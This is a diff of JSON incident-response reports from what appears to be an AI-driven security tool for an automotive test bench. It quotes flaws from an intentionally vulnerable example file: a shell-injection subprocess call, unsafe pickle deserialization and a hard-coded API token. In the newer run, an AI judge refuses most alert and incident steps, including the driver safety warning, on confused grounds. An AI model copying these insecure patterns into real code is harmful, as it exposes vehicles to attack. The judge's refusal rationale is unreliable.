@@ -9,15 +9,15 @@
     "deployment": "examples\\deployments\\03_complex_sdv.yaml"
   },
   "decision": {
-    "summary": "Multiple high-severity findings; one likely active brute-force; topology rule violations.",
+    "summary": "The findings indicate multiple critical vulnerabilities and attacks affecting the automotive system, including hard-coded secrets, unsafe deserialization, disabled TLS verification, CAN-bus injection, and unauthorized command execution. These issues impact the safety and security of the vehicle, potentially compromising life and bodily health, privacy, and material resources.",
     "asset_categories_touched": [
-      "Material and Economic Resources",
+      "Life and Bodily Health",
       "Privacy and Personal Data",
-      "Life and Bodily Health"
+      "Material and Economic Resources"
     ],
-    "recommended_tier": "moderate",
-    "confidence": 0.72,
-    "justification": "Authenticated scanner agents flagged 6 findings (3 high, 3 medium); trajectory and action alignment hold; source authorization OK. Tier 'moderate' chosen \u2014 confidence above moderate_threshold (0.65) but below hard (0.85)."
+    "recommended_tier": "hard",
+    "confidence": 0.92,
+    "justification": "The presence of critical vulnerabilities such as hard-coded secrets, unsafe deserialization, and CAN-bus injection directly threaten the safety and security of the vehicle, impacting life and bodily health. Unauthorized access and command execution can lead to privacy breaches and material damage. The similarity to past incidents with a high confidence level further supports a hard response tier to isolate affected nodes and prevent further exploitation."
   },
   "action": {
     "kind": "isolate_node",
@@ -25,33 +25,33 @@
     "parameters": {
       "target": "TESTBENCH-01"
     },
-    "plan_id": "05b3c509-2297-4669-94c8-1319512135a5"
+    "plan_id": "984915dd-170d-42e9-8754-ac06550f83de"
   },
   "action_report": {
-    "plan_id": "05b3c509-2297-4669-94c8-1319512135a5",
-    "status": "completed",
-    "summary": "[completed] 26 completed \u00b7 0 failed \u00b7 0 refused \u00b7 0 rolled-back \u00b7 0 skipped. blast_radius=node; assets=['Material and Economic Resources', 'Privacy and Personal Data', 'Life and Bodily Health'].",
-    "started_at": "2026-06-03T15:21:17.461487",
-    "finished_at": "2026-06-03T15:21:17.462486",
+    "plan_id": "984915dd-170d-42e9-8754-ac06550f83de",
+    "status": "partial_success",
+    "summary": "[partial_success] 9 completed \u00b7 0 failed \u00b7 13 refused \u00b7 0 rolled-back \u00b7 0 skipped. blast_radius=node; assets=['Life and Bodily Health', 'Privacy and Personal Data', 'Material and Economic Resources'].",
+    "started_at": "2026-06-03T19:44:56.744097",
+    "finished_at": "2026-06-03T19:44:59.723375",
     "tallies": {
-      "total": 26,
-      "completed": 26,
+      "total": 22,
+      "completed": 9,
       "failed": 0,
-      "refused": 0,
+      "refused": 13,
       "rolled_back": 0,
       "skipped": 0
     },
     "plan": {
-      "plan_id": "05b3c509-2297-4669-94c8-1319512135a5",
-      "decision_summary": "Multiple high-severity findings; one likely active brute-force; topology rule violations.",
+      "plan_id": "984915dd-170d-42e9-8754-ac06550f83de",
+      "decision_summary": "The findings indicate multiple critical vulnerabilities and attacks affecting the automotive system, including hard-coded secrets, unsafe deserialization, disabled TLS verification, CAN-bus injection, and unauthorized command execution. These issues impact the safety and security of the vehicle, potentially compromising life and bodily health, privacy, and material resources.",
       "blast_radius": "node",
       "asset_categories": [
-        "Material and Economic Resources",
+        "Life and Bodily Health",
         "Privacy and Personal Data",
-        "Life and Bodily Health"
+        "Material and Economic Resources"
       ],
-      "created_at": "2026-06-03T15:21:17.461487",
-      "estimated_duration_s": 780,
+      "created_at": "2026-06-03T19:44:56.744097",
+      "estimated_duration_s": 660,
       "steps": [
         {
           "rule_id": "LOG-CAN-02",
@@ -69,11 +69,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "3848ce9c-faac-4125-930a-8991cb4f96a4",
+          "step_id": "23e42437-0623-4785-b032-8c2d0e87ba89",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.461487",
-          "finished_at": "2026-06-03T15:21:17.461487",
+          "started_at": "2026-06-03T19:44:57.775118",
+          "finished_at": "2026-06-03T19:44:57.775118",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -103,91 +103,17 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "5b4a9294-fb6b-4eb6-acd9-8d6bd9f29cd9",
+          "step_id": "996f1cf0-2a54-424d-a542-42d257ed8d60",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.461487",
-          "finished_at": "2026-06-03T15:21:17.461487",
+          "started_at": "2026-06-03T19:44:57.775118",
+          "finished_at": "2026-06-03T19:44:57.775118",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
             "params": {
               "node_id": "BodyCtrl",
               "quarantine_vlan": 99
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "contain",
-          "tool": "firewall.rate_limit",
-          "params": {
-            "ipv4": "0.0.0.0",
-            "rate_per_minute": 6,
-            "duration_minutes": 30
-          },
-          "description": "rate-limit the suspect source IP",
-          "side_effect": "write",
-          "severity_min": "medium",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": true,
-          "step_id": "05d3a937-3bb6-4428-b53b-8c36d8e52b09",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.461487",
-          "finished_at": "2026-06-03T15:21:17.461487",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "ipv4": "0.0.0.0",
-              "rate_per_minute": 6,
-              "duration_minutes": 30
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "contain",
-          "tool": "firewall.block_ipv4",
-          "params": {
-            "ipv4": "0.0.0.0",
-            "duration_minutes": 60,
-            "reason": "LOG-AUTH-03"
-          },
-          "description": "block the source IP if attempts continue",
-          "side_effect": "write",
-          "severity_min": "low",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": true,
-          "step_id": "71556e0f-515d-4aa4-af2f-59eb502a3712",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.461487",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "netsh",
-            "params": {
-              "ipv4": "0.0.0.0",
-              "duration_minutes": 60,
-              "reason": "LOG-AUTH-03"
             },
             "_status": "would-execute",
             "_real": false
@@ -212,30 +138,21 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "cb3a5712-5fd6-42b3-b1bf-27c69807b4f2",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "bandit",
-            "params": {
-              "path": "02_can_gateway.py",
-              "analyser": "auto"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "0a1f5048-2487-4c2f-86fc-78642994d045",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-001",
           "kind": "observe",
           "tool": "code.static_scan",
           "params": {
-            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
             "analyser": "auto"
           },
           "description": "run a real second-opinion static scanner",
@@ -247,60 +164,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "04393b07-35a3-48ac-8904-e99bc77f1a0a",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "bandit",
-            "params": {
-              "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "analyser": "auto"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "277a8cf8-602c-4fa5-8ead-59cac0b6adbb",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "observe",
-          "tool": "observe.log_tail",
-          "params": {
-            "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-            "pattern": "Failed password",
-            "timeout_s": 5
-          },
-          "description": "watch the auth log for 5 s after the rate-limit",
-          "side_effect": "read",
-          "severity_min": "low",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": false,
-          "step_id": "e254f0d3-2213-4561-95fd-4c13d97d3459",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-              "pattern": "Failed password",
-              "timeout_s": 5
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-003",
@@ -318,11 +189,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "e061fc95-8c7a-4aa5-8a39-3df2271b2480",
+          "step_id": "497374ba-f357-4825-9014-27e941a220dd",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.722468",
+          "finished_at": "2026-06-03T19:44:59.722468",
           "output": {
             "dry_run": true,
             "would_invoke": "vault",
@@ -354,11 +225,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "8d32a9e0-324e-4c31-a3a1-7b5450c93bfd",
+          "step_id": "3050839a-517b-4d3a-852a-3d446e2afc21",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -393,11 +264,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "cf137a43-60d7-42ac-8a61-2214f47c3e2f",
+          "step_id": "8cf83d9e-6c6e-4dd0-b2ef-0c968abcc765",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -432,11 +303,11 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "48b8fd34-4fa4-4d63-b57a-5850423da0cc",
+          "step_id": "45e6c112-1df6-444a-82f2-fd200b7ec813",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
@@ -458,8 +329,8 @@
           "tool": "code.propose_patch",
           "params": {
             "rule_id": "CODE-001",
-            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
+            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
             "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
           },
           "description": "propose a safe-by-construction patch",
@@ -471,18 +342,18 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "703c1c5f-d200-4034-abac-197ad25022cf",
+          "step_id": "ca5998aa-df44-4806-9a6c-f67a990ea06c",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
             "params": {
               "rule_id": "CODE-001",
-              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
+              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
               "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
             },
             "_status": "would-execute",
@@ -492,13 +363,13 @@
           "refusal_reason": null
         },
         {
-          "rule_id": "CODE-002",
+          "rule_id": "CODE-040",
           "kind": "eradicate",
           "tool": "code.propose_patch",
           "params": {
-            "rule_id": "CODE-002",
-            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
+            "rule_id": "CODE-040",
+            "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+            "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-040  (high)\n# evidence: gateway_loop()\n# remediation: follow the rule's remediation guidance.\n",
             "rationale": "Auto-generated remediation proposal."
           },
           "description": "propose a remediation patch",
@@ -510,18 +381,18 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "72e2b70c-38d0-4a16-a2f0-97f3ec956337",
+          "step_id": "fdc6eb8b-8b70-4413-b54c-30bd3584f28c",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "(no real binary)",
             "params": {
-              "rule_id": "CODE-002",
-              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
+              "rule_id": "CODE-040",
+              "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+              "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-040  (high)\n# evidence: gateway_loop()\n# remediation: follow the rule's remediation guidance.\n",
               "rationale": "Auto-generated remediation proposal."
             },
             "_status": "would-execute",
@@ -549,25 +420,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "35c5fbc8-6f3b-4ed7-9a83-29479a0e36c1",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "critical",
-              "summary": "Hard-coded secret in source",
-              "rule_id": "CODE-003",
-              "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "b8a49772-1ab2-4f1f-88d0-b62a808620a2",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-005",
@@ -588,25 +448,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "00f00aab-ed29-48e9-ba45-732e6e7bfe94",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "critical",
-              "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-              "rule_id": "CODE-005",
-              "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "88d52b96-26c4-4264-8304-0c73e5083754",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "LOG-CAN-02",
@@ -626,24 +475,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "01f59bd8-0011-405b-9a41-b8db92160083",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "vehicle": "TESTBENCH-01",
-              "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-              "urgency": "critical"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "2f1389a0-291b-4777-bd98-b7fab3eef1d1",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-006",
@@ -663,24 +502,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "50f29dc6-5771-4c98-ac9e-758e33fcb36b",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "CODE-006: TLS certificate verification disabled",
-              "rule_id": "CODE-006"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "63bd90f6-c6cf-4b47-af53-15bdd9638ec0",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-001",
@@ -688,9 +517,9 @@
           "tool": "notify.create_incident",
           "params": {
             "severity": "high",
-            "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
+            "summary": "CODE-001: The use of subprocess with shell=True allows command injection if actuator_name ",
             "rule_id": "CODE-001",
-            "evidence": "subprocess.call(user_input, shell=True)"
+            "evidence": "return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)"
           },
           "description": "open a code-vulnerability incident",
           "side_effect": "read",
@@ -701,37 +530,25 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "c6188e51-9ae1-4847-8b01-7582578eb173",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-              "rule_id": "CODE-001",
-              "evidence": "subprocess.call(user_input, shell=True)"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "a6c01ec0-56ea-4e86-9967-b435250349f5",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
-          "rule_id": "LOG-NET-01",
+          "rule_id": "CODE-040",
           "kind": "notify",
           "tool": "notify.create_incident",
           "params": {
             "severity": "high",
-            "summary": "LOG-NET-01: log anomaly",
-            "rule_id": "LOG-NET-01",
-            "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
+            "summary": "CODE-040: Sensitive gateway loop function is executed without authentication, which can ex",
+            "rule_id": "CODE-040"
           },
-          "description": "open a log-anomaly incident",
+          "description": "open a generic code-vuln incident",
           "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
@@ -740,25 +557,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "49d5876c-e179-4fb6-a126-2d30c669091e",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "LOG-NET-01: log anomaly",
-              "rule_id": "LOG-NET-01",
-              "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "5349c396-53b9-49ed-b256-1c9dbc4ae61c",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "TOP-001",
@@ -778,24 +584,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "4a55363f-1545-4f0c-bac5-eda81c375441",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-              "rule_id": "TOP-001"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "0ab48592-76ab-4037-9daf-faa22f995873",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "TOP-002",
@@ -815,24 +611,14 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "d9d8554d-f264-444e-affa-4cfac0f257e9",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-002: External actors must not write to long-term memory",
-              "rule_id": "TOP-002"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "8848e162-aff1-4f9e-b040-f39fc2efad58",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "TOP-007",
@@ -852,35 +638,25 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "4560a414-e662-45f6-ab39-cc7921fead51",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-              "rule_id": "TOP-007"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "2b4c6007-0e45-4312-8815-6a55ded55a43",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
-          "rule_id": "CODE-002",
+          "rule_id": "TOP-008",
           "kind": "notify",
           "tool": "notify.create_incident",
           "params": {
             "severity": "medium",
-            "summary": "CODE-002: Weak hash algorithm for password storage.",
-            "rule_id": "CODE-002"
+            "summary": "TOP-008: External A2A agents should not have response capabilities to in-vehicle agents t",
+            "rule_id": "TOP-008"
           },
-          "description": "open a generic code-vuln incident",
+          "description": "raise an architecture-review ticket",
           "side_effect": "read",
           "severity_min": "low",
           "timeout_s": 30,
@@ -889,70 +665,21 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "24166842-8d26-4fd8-a030-e38f22de53d8",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "medium",
-              "summary": "CODE-002: Weak hash algorithm for password storage.",
-              "rule_id": "CODE-002"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "93377ce0-0e40-40fe-ad4b-a1a046494a6d",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
-        },
-        {
-          "rule_id": "LOG-AUTH-03",
-          "kind": "notify",
-          "tool": "notify.create_incident",
-          "params": {
-            "severity": "high",
-            "summary": "Brute-force pattern detected",
-            "rule_id": "LOG-AUTH-03",
-            "evidence": "12 failed auth attempts in 30 s, user='root'"
-          },
-          "description": "open a security-team incident",
